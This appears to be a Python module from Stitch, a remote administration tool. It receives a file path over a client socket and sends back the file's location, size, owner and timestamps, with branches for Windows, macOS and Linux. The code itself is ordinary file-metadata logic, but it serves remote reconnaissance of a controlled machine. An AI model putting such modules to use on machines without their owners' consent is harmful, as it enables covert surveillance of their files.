# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os
import sys
import math
import datetime

#http://stackoverflow.com/questions/5194057/better-way-to-convert-file-sizes-in-python
def convertSize(size):
   if (size == 0):
       return '0 Bytes'
   size_name = ("Bytes", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
   i = int(math.floor(math.log(size,1024)))
   p = math.pow(1024,i)
   s = round(size/p,2)
   return '{} {}'.format(s,size_name[i])

#http://stackoverflow.com/questions/1392413/calculating-a-directory-size-using-python
def get_dir_size(start_path = '.'):
    total_size = 0
    for dirpath, dirnames, filenames in os.walk(start_path):
        for f in filenames:
            fp = os.path.join(dirpath, f)
            total_size += os.path.getsize(fp)
    return total_size

def get_time_date(t):
    return datetime.datetime.fromtimestamp(t)

infofile = receive(client_socket)
if os.path.exists(infofile):
    path = os.path.abspath(infofile)
    if os.path.isdir(infofile):
        total_size = get_dir_size(infofile)
    else:
        total_size = os.stat(infofile).st_size
    size = convertSize(total_size)
    uid = os.stat(infofile).st_uid
    modified = get_time_date(os.path.getmtime(infofile))
    accessed = get_time_date(os.path.getatime(infofile))
    if win_client():
        created = get_time_date(os.path.getctime(infofile))
    if osx_client():
        try:
            created = get_time_date(os.stat(infofile).st_birthtime)
        except Exception as e:
            created = get_time_date(os.path.getctime(infofile))
            pass
    if lnx_client():
        created = get_time_date(os.stat(infofile).st_mtime)

    resp = 'Location{6:10}: {0}\n\nSize{6:14}: {1} ({2} bytes)\n\nCreated{6:11}: {3}\n'\
            'Modified{6:10}: {4}\nAccessed{6:10}: {5}\n'.format(path,size,total_size,
                                                    created,modified,accessed, " ")

else:
    resp = "[!] {}: No such file or directory\n".format(infofile)
send(client_socket,resp)
